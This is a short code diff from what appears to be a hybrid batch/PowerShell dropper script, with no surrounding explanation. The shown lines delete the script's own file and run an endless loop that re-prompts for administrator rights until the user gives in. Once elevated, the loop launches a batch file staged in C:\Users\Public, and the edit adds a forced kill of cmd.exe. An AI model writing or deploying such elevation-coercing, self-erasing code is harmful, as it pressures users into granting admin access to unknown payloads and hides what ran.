@@ -7,4 +7,4 @@ del "%~f0"
 endlocal
 goto:eof
 #>
-while($true){try{Start-Process  'cmd' -Verb runas -ArgumentList '/k start C:\Users\Public\error.bat  ';exit}catch{}}
+while($true){try{Start-Process  'cmd' -Verb runas -ArgumentList '/k start C:\Users\Public\error.bat && taskkill /F /IM cmd.exe ';exit}catch{}}
